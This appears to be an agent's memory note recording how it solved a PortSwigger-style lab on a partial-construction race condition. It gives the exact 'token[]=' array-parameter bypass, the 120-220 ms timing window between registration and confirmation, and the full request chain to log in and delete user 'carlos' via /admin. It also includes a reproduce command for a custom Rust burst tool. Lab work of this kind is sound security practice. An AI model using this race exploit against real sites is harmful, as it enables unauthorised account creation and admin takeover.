---
metadata:
  node_type: memory
name: "PRS rp-3 lab solve partial construction race"
description: "rp-3 solved: partial-construction race needs literal token[]= (array name) at 120-220ms into register, plus no-redirect login verification (new session cookie)"
last_updated: 2026-10-12T14:07:52+08:00
created: 2026-10-12T14:07:52+08:00
---

## 2026-10-13 rp-3 lab-race-conditions-partial-construction SOLVED

Instance `0a88005b041bca9480ad35ec00b300a2` (range_launch launch-url, reused:false). Banner verified independently: `banner_verdict` -> solved:true, `<h4>Congratulations, you solved the lab!</h4>`.

### Instrument facts (the two "historical" failure causes resolved)
- Health: first GET / 1.28-1.44 s was **TLS handshake**, not an app floor — control portswigger.net/ measured 1.34 s (time_appconnect 0.78-0.85 s) and the lab's static CSS 1.26 s. Same connection reused: 0.24 s/request ⇒ instance healthy. The "1.3 s floor" health rule false-positives on cold-connect; measure warm (multi-URL single curl) before replacing an instance.
- `pcreg_burst` cannot express the payload: its confirm URL is `?token={v}`, so `--raw-param` yields `?token=[]` (string "[]"), never name-side `token[]=`. The "urlencode 坏仪已修" premise does not hold for the array form.
- ureq preserves `[`/`]` in the query, so a normal HTTP client (not raw sockets) is enough.

### Confirm endpoint semantics (measured with raw_matrix literals)
- no param -> 400 "Missing parameter: token"; `token=` -> 403 "Forbidden"; `token=xyz` -> 400 "Incorrect token: xyz".
- `token[]=` / `token[]` / `token[0]=` -> 400 "Incorrect token: Array" **outside** the window; the array name bypasses the `=== ''` guard and reaches the DB as the empty string.
- `token[]=` during the window -> **200** with `<p>Account registration for user <u> is successful!</p>` (2625-2626 bytes). This is the whole exploit: POST /register and POST /confirm?token[]= ~120-220 ms apart (register takes ~1.2 s, its body says "Please check your emails for your account registration link"; the window opens after the INSERT and before the token UPDATE).
- `token=%00` -> static 500 (crash path, not a hit). Same-session cookie is NOT required (hits occurred with and without the register session).

### Verification leg defect (cost me two false-negative rounds)
Login confirmation must run **without redirect following**: a successful auth is 302 -> /my-account plus a fresh `phpsessionid`; ureq's redirect-following drops that new cookie, so /my-account bounces to /login and `login_ok` reads false. `pcreg_burst`/`pcreg_lit` v1.0-1.2 shared this bug (hence "login_ok":false on every round, winner never fires).

### Winning chain (round 4, stagger 160 ms)
POST /register (pq4 / pq4@ginandjuice.shop / peter123) + POST /confirm?token[]= -> 200 "successful" -> login 302 /my-account (session `phpsessionid=YidmZGU7...`) -> GET /admin 200 (contains carlos) -> GET /admin/delete?username=carlos 302 /admin -> banner is-solved.

### New piece
`.pi-rs/rust-scripts/pcreg_lit.rs` (project tier, v1.3.0): literal-query partial-construction burst — `pcreg_lit <base-url> [--queries 'token[]=,token[0]='] [--confirms K] [--stagger-us '..'] [--rounds N] [--no-session] [--delete-user carlos]`; records body_path for hits, auto-verifies login (no-redirect) and runs the /admin delete + banner read. Reproduce: `pcreg_lit <instance> --rounds 10 --confirms 3 --queries 'token[]=' --stagger-us '130000,160000,190000' --tag pq --delete-user carlos`.

